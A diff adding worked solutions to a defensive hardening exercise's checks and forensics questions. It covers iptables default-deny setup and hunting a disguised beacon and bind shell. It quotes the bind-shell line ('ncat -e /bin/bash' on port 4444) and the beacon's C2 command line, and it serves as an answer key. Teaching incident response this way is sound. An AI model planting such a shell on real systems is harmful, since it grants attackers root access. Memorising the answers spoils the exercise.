@@ -69,6 +69,29 @@ checks:
       equals: true
       field: data
       points: 5
+    solution: |
+      **1. Read the wall.** `iptables -S INPUT` prints the chain's policy line
+      and every rule in it. On the fresh box there is nothing for port 80, so
+      visitor traffic to the cargo-manifest web app dies at the wall.
+
+      **2. Open exactly one port.**
+
+      ```
+      iptables -A INPUT -p tcp --dport 80 -j ACCEPT
+      ```
+
+      A multiport variant (`-m multiport --dports 80,443`) matches too.
+      Resist anything broader -- an "allow everything" rule makes the rest of
+      the firewall work pointless and earns nothing extra.
+
+      **3. Confirm.** Your line shows up in `iptables -S INPUT` (that exact
+      shape is what the check greps for), and once the default-deny policies
+      are in, the web app still answers on port 80.
+
+      **4. Make it survive a reboot (hygiene, not scored).** Live rules
+      vanish at reboot: `apt install iptables-persistent` then
+      `netfilter-persistent save` writes the ruleset to
+      /etc/iptables/rules.v4.
 
   - id: db_output_3306_allowed
     type: command_json
@@ -85,6 +108,29 @@ checks:
       equals: true
       field: data
       points: 10
+    solution: |
+      **1. Know why this port is load-bearing.** The web app's database is
+      NOT on this box -- it is the harbor's shared MariaDB at
+      192.168.100.10:3306 on the workshop network. Under the default-deny
+      OUTPUT policy of the next challenge, the app loses its data unless you
+      open exactly this egress path. That is the lesson: default-deny is
+      only safe when you can name every flow you must allow.
+
+      **2. Add the egress rule** before flipping any policy:
+
+      ```
+      iptables -A OUTPUT -d 192.168.100.10 -p tcp --dport 3306 -j ACCEPT
+      ```
+
+      The un-scoped `iptables -A OUTPUT -p tcp --dport 3306 -j ACCEPT`
+      scores too; scoping to the database host is the better habit.
+
+      **3. Confirm.** Re-run `iptables -S OUTPUT` and see your rule, then
+      test the path the way the box's own probe does:
+
+      ```
+      timeout 3 bash -c '</dev/tcp/192.168.100.10/3306' && echo db-reachable
+      ```
 
   - id: default_deny_all
     type: command_json
@@ -115,6 +161,52 @@ checks:
       equals: true
       field: data
       points: 20
+    solution: |
+      The flagship task -- and the order you do it in decides whether you
+      end up with a hardened harbor or a locked box. **Add the exceptions
+      first; flip the policies to DROP last.**
+
+      **1. Keep loopback alive.** Local programs -- the web app's own
+      health check, the scoring agent's probes -- talk over `lo`:
+
+      ```
+      iptables -A INPUT -i lo -j ACCEPT
+      iptables -A OUTPUT -o lo -j ACCEPT
+      ```
+
+      **2. Keep your own session breathing.** Your SSH connection is made of
+      replies to traffic the box itself sent out:
+
+      ```
+      iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+      iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+      ```
+
+      **3. Keep the business flows and your management path:** inbound 80
+      for visitors, inbound 22 so you can still reach the box (the SSH
+      penalty measures exactly that), outbound 3306 for the shared
+      database. Optional realism extras the checks don't require: outbound
+      53 for DNS, outbound 80/443 so apt keeps working.
+
+      **4. Now flip the default.** All three:
+
+      ```
+      iptables -P INPUT DROP
+      iptables -P FORWARD DROP
+      iptables -P OUTPUT DROP
+      ```
+
+      **5. Prove the harbor still works** -- the check itself tests both:
+
+      ```
+      curl -s http://127.0.0.1/ | grep -i cargo
+      timeout 3 bash -c '</dev/tcp/192.168.100.10/3306' && echo db-ok
+      ```
+
+      If curl fails, your loopback rules are missing; if the DB probe fails,
+      the OUTPUT 3306 rule is missing or mistyped. And if your SSH window
+      ever froze and then recovered, that was the ESTABLISHED rule doing its
+      job -- without it, flipping the policies is what locks you out.
 
   - id: console_reachable
     type: db_query
@@ -128,6 +220,25 @@ checks:
       equals: true
       field: ok
       points: -10
+    solution: |
+      This one only ever subtracts: the moment 127.0.0.1:22 stops answering,
+      10 points come off the board. On this box that happens one way --
+      flipping INPUT or OUTPUT to DROP before the loopback and ESTABLISHED
+      rules exist, or adding an over-broad rule that blocks port 22. A
+      default-deny box that also locks out its own administrators is not
+      hardened, it is bricked.
+
+      **Avoid it:** do the default-deny task exceptions-first, policies-last.
+
+      **Check yourself at any time:**
+
+      ```
+      timeout 3 bash -c '</dev/tcp/127.0.0.1/22' && echo ssh-alive
+      ```
+
+      If nothing prints, re-add `iptables -A INPUT -i lo -j ACCEPT` (and
+      `-A OUTPUT -o lo -j ACCEPT`) before anything else touches the
+      firewall.
 
   # --- remove the unnecessary management listener ---------------------------
   - id: cockpit_removed
@@ -148,6 +259,35 @@ checks:
       equals: true
       field: data
       points: 10
+    solution: |
+      **1. Find the listener.** `ss -tlnp | grep 9090` -- and note the process
+      name may be `systemd` itself: with socket activation, systemd holds
+      port 9090 on behalf of `cockpit.socket` until someone connects.
+      `systemctl list-sockets` tells the same story.
+
+      **2. Decide it's excess.** Cockpit is a browser-based admin console --
+      a second management surface with its own CVE history, on a box
+      administered over SSH. Any unneeded web console is free ground for the
+      red team.
+
+      **3. Turn it off at the socket and the service:**
+
+      ```
+      systemctl disable --now cockpit.socket cockpit.service
+      ```
+
+      `--now` stops *and* disables in one shot; the socket is the piece
+      actually listening on 9090, so the port goes quiet immediately.
+
+      **4. Purge it** so nothing re-enables it later:
+
+      ```
+      DEBIAN_FRONTEND=noninteractive apt-get remove -y --purge cockpit
+      ```
+
+      **5. Confirm.** `ss -tlnp | grep 9090` prints nothing and
+      `systemctl is-enabled cockpit.socket cockpit.service` does not say
+      `enabled` (disabled, masked, static, or not-found all count).
 
   # --- the DISASTEROUS_PHARMACY beacon: find it, kill it, purge it ----------
   - id: beacon_service_removed
@@ -161,6 +301,31 @@ checks:
       equals: false
       field: enabled
       points: 10
+    solution: |
+      **1. Meet the launcher.** `systemctl list-unit-files | grep -i tide`
+      shows `tide-sync.service` -- enabled. Read it before touching it:
+
+      ```
+      systemctl cat tide-sync.service
+      ```
+
+      The unit calls itself "Tide table sync service", but its `ExecStart=`
+      line tells the real story:
+      `/opt/tide-sync/tide-syncd -t 10.233.0.66 -p 8443 -i 30 -n 0 -b
+      DISASTEROUS_PHARMACY` -- a target address, a port, a 30-second
+      interval, and the malware's own codename. Two more tells:
+      `Restart=always` (kill the process and systemd brings it back) and
+      `StandardOutput=null` / `StandardError=null` (the journal is
+      deliberately silenced).
+
+      **2. Disable it** so it cannot come back at boot:
+
+      ```
+      systemctl disable tide-sync.service
+      ```
+
+      Stopping the process (next challenge) and deleting the binary (the
+      one after) complete the removal -- all three are scored separately.
 
   - id: beacon_process_gone
     type: process_state
@@ -173,6 +338,40 @@ checks:
       equals: false
       field: running
       points: 20
+    solution: |
+      This beacon holds NO port -- `ss -tulpn` shows nothing suspicious.
+      That is the whole lesson: port review alone does not find this kind of
+      malware; process and unit review does.
+
+      **1. Hunt by process list.** `ps aux` shows a root process with a very
+      chatty command line:
+
+      ```
+      root  ...  /opt/tide-sync/tide-syncd -t 10.233.0.66 -p 8443 -i 30 -n 0 -b DISASTEROUS_PHARMACY
+      ```
+
+      Everything the beacon is, is in that line: where it dials, how often,
+      its codename. (It is also where the forensics answer for the C2
+      destination comes from.)
+
+      **2. Cross-check the unit.** `systemctl status tide-sync.service`
+      gives the PID and the owning unit; `systemctl list-units --type=service
+      | grep -i tide` finds it even when a process hides under a blander
+      name.
+
+      **3. Kill it the right way.** `kill <pid>` looks convincing -- and
+      `Restart=always` brings it back within moments (run `ps aux` again:
+      new PID, same beacon). Take away the launcher instead:
+
+      ```
+      systemctl stop tide-sync.service
+      ```
+
+      `stop` kills the whole cgroup, and systemd does not resurrect what it
+      itself stopped.
+
+      **4. Confirm.** `ps aux | grep tide-sync` prints nothing but your own
+      grep.
 
   - id: beacon_binary_removed
     type: permission
@@ -185,6 +384,28 @@ checks:
       equals: false
       field: exists
       points: 5
+    solution: |
+      **1. Look at what they left behind.**
+
+      ```
+      ls -l /opt/tide-sync/
+      file /opt/tide-sync/tide-syncd     # a compiled ELF binary, not a script
+      ```
+
+      A compiled implant under /opt behind a bland directory name is a
+      classic persistence kit: even with the service disabled, the binary is
+      one `systemctl enable` away from running again.
+
+      **2. Delete it** -- with the process stopped first (removing the file
+      does not stop an already-running program):
+
+      ```
+      systemctl stop tide-sync.service
+      rm -rf /opt/tide-sync
+      ```
+
+      **3. Confirm.** `ls /opt/tide-sync` errors with "No such file or
+      directory" -- the scored state is exactly that: gone from disk.
 
   # --- the bind shell: port-visible, respawn-prone --------------------------
   - id: bind_shell_removed
@@ -203,6 +424,53 @@ checks:
       equals: true
       field: data
       points: 20
+    solution: |
+      **1. Spot it by port review** -- this one is the opposite of the
+      beacon: it *wants* to be found by `ss`:
+
+      ```
+      ss -tlnp | grep 4444
+      LISTEN 0 1 0.0.0.0:4444  users:(("ncat",pid=812,fd=3))
+      ```
+
+      `ncat` listening on 0.0.0.0:4444 on a cargo box is not something
+      someone "left open" by accident. Own the process: `systemctl status
+      812` (systemd accepts a PID) names the unit -- `system-update.service`,
+      display name "System Update Check".
+
+      **2. Read the unit; it confesses:**
+
+      ```
+      systemctl cat system-update.service
+      ```
+
+      `ExecStart=/usr/bin/ncat -l -k -p 4444 -e /bin/bash` -- a *bind shell*:
+      `-l` listen, `-p` port, `-k` keep serving connection after connection,
+      `-e /bin/bash` hand every connector a root shell. Anyone who can reach
+      the box on 4444 owns it. Note the bland unit name -- the same trick as
+      the beacon.
+
+      **3. Kill AND disable.** Stopping the unit kills ncat through its
+      cgroup (killing one ncat child does nothing -- `-k` keeps listening);
+      disabling keeps it from coming back at boot:
+
+      ```
+      systemctl stop system-update.service
+      systemctl disable system-update.service
+      pkill -x ncat     # belt and braces
+      ```
+
+      **4. Confirm every condition the check grades:**
+
+      ```
+      pgrep -ax ncat                                   # nothing
+      ss -tln | grep 4444                              # nothing
+      systemctl is-enabled system-update.service || echo not-enabled
+      ```
+
+      All quiet, and `is-enabled` exits non-zero (disabled, not-found, or
+      masked all pass). One trap: the check fails if ANY ncat process is
+      running -- even one you started yourself for testing.
 
 theme:
   title: "Opochtli Landing Port Authority"
@@ -228,8 +496,37 @@ forensics:
     answer: "10.233.0.66:8443"
     answers: ["10.233.0.66 8443", "10.233.0.66 port 8443"]
     points: 20
+    solution: |
+      The beacon's own command line is the answer sheet. `ps aux` and read
+      the `/opt/tide-sync/tide-syncd` line, or `systemctl cat
+      tide-sync.service` and read its `ExecStart=`:
+
+      ```
+      /opt/tide-sync/tide-syncd -t 10.233.0.66 -p 8443 -i 30 -n 0 -b DISASTEROUS_PHARMACY
+      ```
+
+      `-t` is the C2 destination, `-p` the destination port, `-i 30` the
+      dial-home interval. A packet capture would show the same pair -- but
+      reading what a process dials beats capturing it. (The address is
+      RFC 1918 lab space and unreachable from the box's network, which is
+      why the beacon's traffic never actually went anywhere.)
   - id: fq-bind-shell
     question: "A bind shell backdoor is hiding on this box under a bland name. What address AND port was it bound to? (`ss -tlnp` shows listeners; the address it binds tells you who can reach it.)"
     answer: "0.0.0.0:4444"
     answers: ["0.0.0.0 4444", "0.0.0.0 port 4444"]
     points: 20
+    solution: |
+      `ss -tlnp` is the whole story -- the Local Address:Port column is the
+      answer:
+
+      ```
+      LISTEN 0 1 0.0.0.0:4444  users:(("ncat",pid=812,fd=3))
+      ```
+
+      `0.0.0.0` means "every interface": the backdoor answers for anyone who
+      can reach the box, and 4444 is the door. Both numbers came from the
+      `system-update.service` unit (`ncat -l -k -p 4444 -e /bin/bash`), so
+      the pair is still sitting in that unit file if you already removed the
+      shell. Contrast with the beacon: a bind shell binds and waits, a C2
+      beacon dials out and holds no port -- you hunt them with different
+      tools.
